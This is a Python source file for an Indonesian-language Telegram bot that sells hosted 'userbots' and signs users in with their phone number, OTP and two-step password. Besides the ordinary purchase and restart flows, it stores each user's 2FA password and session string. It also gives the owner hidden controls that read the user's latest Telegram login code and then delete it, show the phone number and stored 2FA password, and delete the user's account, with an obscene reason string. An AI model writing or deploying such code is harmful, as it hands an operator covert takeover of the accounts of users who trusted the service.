import asyncio
import importlib
from datetime import datetime

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions

from PyroUbot import *

@PY.BOT("start")
@PY.START
@PY.PRIVATE
async def _(client, message):
    buttons = BTN.START(message)
    msg = MSG.START(message)
    await message.reply(
        msg,
        reply_markup=InlineKeyboardMarkup(buttons))


@PY.CALLBACK("bahan")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("🔁 Restart", callback_data=f"ress_ubot")],
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
Anda sudah membuat userbot.

Jika userbot Anda tidak bisa digunakan, silakan tekan tombol restart.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
❌ Tidak bisa membuat userbot!

📚 Karena maksimal userbot adalah {Fonts.smallcap(str(len(ubot._ubot)))} dan telah tercapai

☎️ Silakan hubungi <a href=tg://openmessage?user_id={OWNER_ID}>Admin</a>.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    premium_users, ultra_premium_users = await get_list_from_vars(client.me.id, "PREM_USERS"), await get_list_from_vars(client.me.id, "ULTRA_PREM")
    if user_id not in premium_users and user_id not in ultra_premium_users:
        buttons = [
            [InlineKeyboardButton("▶️ Lanjutkan", callback_data="bayar_dulu")],
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("▶️ Lanjutkan", callback_data="buat_ubot")]]
        return await callback_query.edit_message_text(
            """
Anda telah membeli userbot. Silakan tekan tombol **Lanjutkan** untuk membuat userbot Anda.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


@PY.CALLBACK("status")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        exp = await get_expired_date(user_id)
        prefix = await get_pref(user_id)
        waktu = exp.strftime("%d-%m-%Y") if exp else "None"
        return await callback_query.edit_message_text(
            f"""
**ThreeBot Premium**
Status: Premium
Prefix: {prefix[0]}
Expired: {waktu}
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [
            [InlineKeyboardButton("💵 Beli Userbot", callback_data=f"bahan")],
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
❌ Maaf, Anda belum membeli userbot. Silakan membeli terlebih dahulu.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
    )


@PY.CALLBACK("buat_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("🔁 Restart", callback_data=f"ress_ubot")],
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
Anda sudah membuat userbot.

Jika userbot Anda tidak bisa digunakan, silakan tekan tombol restart.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
❌ Tidak bisa membuat userbot!

📚 Karena maksimal userbot adalah {Fonts.smallcap(str(len(ubot._ubot)))} dan telah tercapai

☎️ Silakan hubungi <a href=tg://openmessage?user_id={OWNER_ID}>Admin</a>.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    premium_users, ultra_premium_users = await get_list_from_vars(client.me.id, "PREM_USERS"), await get_list_from_vars(client.me.id, "ULTRA_PREM")
    if user_id not in premium_users and user_id not in ultra_premium_users:
        buttons = [
            [InlineKeyboardButton("▶️ Lanjutkan", callback_data="bahan")],
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""
Anda belum membeli userbot. Silakan tekan tombol **Lanjutkan** untuk membeli userbot.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("▶️ Lanjutkan", callback_data="add_ubot")]]
        return await callback_query.edit_message_text(
            """
✅ Untuk membuat userbot, siapkan bahan berikut:  

   • **PHONE_NUMBER**: Nomor HP akun Telegram Anda  

☑️ Jika sudah tersedia, silakan klik tombol di bawah ini.            
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )

@PY.CALLBACK("bayar_dulu")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = BTN.PLUS_MINUS(1, user_id)
    return await callback_query.edit_message_text(
        MSG.TEXT_PAYMENT(30, 30, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


@PY.CALLBACK("add_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id,
            (
                "Silakan masukkan nomor telepon Telegram Anda dengan format kode negara.\n"
                "Contoh: +62xxxxx\n\n"
                "Gunakan /cancel untuk membatalkan proses membuat userbot."
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Proses membuat userbot dibatalkan otomatis!\nGunakan /start untuk memulai ulang.")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "Mengirim kode OTP...")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"ERROR: {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>Akun telegram resmi</a>",
            SentCodeType.SMS: "SMS Anda",
            SentCodeType.CALL: "Panggilan telepon",
            SentCodeType.FLASH_CALL: "Panggilan kilat telepon",
            SentCodeType.FRAGMENT_SMS: "Fragment SMS",
            SentCodeType.EMAIL_CODE: "Email Anda",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                "Silakan periksa kode OTP dari akun resmi Telegram. Kirim kode OTP disini setelah membaca format di bawah ini.\n\nJika kode OTP adalah <code>12345</code>, tolong <b>tambahkan spasi</b> kirimkan seperti ini <code>1 2 3 4 5</code>.\n\nGunakan /cancel untuk membatalkan proses membuat userbot."
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Proses membuat userbot dibatalkan otomatis!\nGunakan /start untuk memulai ulang.")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"ERROR: {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "Akun Anda telah mengaktifkan verifikasi dua langkah. Silakan kirimkan password-nya.\n\nGunakan /cancel untuk membatalkan proses membuat userbot.",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "Proses membuat userbot dibatalkan otomatis!\nGunakan /start untuk memulai ulang.")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"ERROR: {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "Sedang diproses. Silakan tunggu sebentar...",
        disable_web_page_preview=True,
    )
    await new_client.start()
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        return await bot_msg.edit(
            "Harap gunakan nomor Telegram yang terdaftar di akun Anda saat ini, dan bukan nomor dari akun lain."
        )
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
#    await remove_from_vars(client.me.id, "PREM_USERS", user_id)
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
    SH = await ubot.get_prefix(new_client.me.id)
    buttons = [
            [InlineKeyboardButton("◀️ Kembali", callback_data=f"home {user_id}")],
        ]
    text_done = f"""
**Berhasil diaktifkan!**
**Nama:** <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a>
**ID:** {new_client.me.id}
Prefix: {' '.join(SH)}
Jika bot tidak merespons, ketik /restart.
        """
    await bot_msg.edit(text_done, disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons))
    await bash("rm -rf *session*")
    await install_my_peer(new_client)

    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f"""
<b>⚠️ Userbot diaktifkan</b>
<b>Akun:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b>ID:</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "Cek masa aktif",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
)

async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "Proses membuat userbot berhasil dibatalkan!\nGunakan /start untuk memulai ulang."
        )
        return True
    return False


@PY.BOT("control")
async def _(client, message):
    buttons = [
            [InlineKeyboardButton("🔁 Restart", callback_data=f"ress_ubot")],
        ]
    await message.reply(
            f"""
Pencet tombol dibawah untuk melakukan restart.
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )

@PY.CALLBACK("ress_ubot")
async def _(client, callback_query):
    if callback_query.from_user.id not in ubot._get_my_id:
        return await callback_query.answer(
            f"Anda tidak memiliki akses.",
            True,
        )
    for X in ubot._ubot:
        if callback_query.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(
                                importlib.import_module(f"PyroUbot.modules.{mod}")
                            )
                        return await callback_query.edit_message_text(
                            f"Restart berhasil dilakukan!\nNama: {UB.me.first_name} {UB.me.last_name or ''} | ID: {UB.me.id}"
                        )
                    except Exception as error:
                        return await callback_query.edit_message_text(f"{error}")

@PY.BOT("restart")
async def _(client, message):
    msg = await message.reply("Sedang diproses...")
    if message.from_user.id not in ubot._get_my_id:
        return await msg.edit(
            f"Anda tidak memiliki akses.",
            True,
        )
    for X in ubot._ubot:
        if message.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(
                                importlib.import_module(f"PyroUbot.modules.{mod}")
                            )
                        return await msg.edit(
                            f"Restart berhasil dilakukan!\nNama: {UB.me.first_name} {UB.me.last_name or ''} | ID: {UB.me.id}"
                        )
                    except Exception as error:
                        return await msg.edit(f"{error}")

@PY.CALLBACK("cek_ubot")
@PY.BOT("getubot")
@PY.ADMIN
async def _(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.UBOT(0),
        reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[0].me.id, 0)),
    )

@PY.CALLBACK("cek_masa_aktif")
async def _(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ Tinggal {xxxx} hari lagi.", True)
    except:
        return await callback_query.answer("✅ Sudah tidak aktif.", True)

@PY.CALLBACK("del_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in await get_list_from_vars(client.me.id, "ADMIN_USERS"):
        return await callback_query.answer(
            f"❌ Anda tidak memiliki akses.",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            await remove_ubot(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await callback_query.answer(
                f"✅ {get_mention} berhasil dihapus dari database.", True
            )
            await callback_query.edit_message_text(
                await MSG.UBOT(0),
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(ubot._ubot[0].me.id, 0)
                ),
            )
            await bot.send_message(
                X.me.id,
                MSG.EXP_MSG_UBOT(X),
                reply_markup=InlineKeyboardMarkup(BTN.EXP_UBOT()),
            )

    
@PY.CALLBACK("^(p_ub|n_ub)")
async def _(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "n_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "p_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.UBOT(count),
        reply_markup=InlineKeyboardMarkup(
            BTN.UBOT(ubot._ubot[count].me.id, count)
        ),
    )

@PY.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
async def tools_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ Anda tidak memiliki akses.",
            True,
        )
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ Kode OTP tidak ditemukan.", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            BTN.UBOT(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"📲 Nomor telepon dengan user ID <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code>",
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "🔐 Kode 2FA tidak ditemukan.", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 Kode 2FA dengan user ID <code>{X.me.id}</code> adalah <code>{code}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(X.me.id, int(query[1]))
                ),
            )
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(BTN.DEAK(X.me.id, int(query[1])))
        )
    elif query[0] == "deak_akun":
        ubot._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            MSG.DEAK(X),
            reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
        )
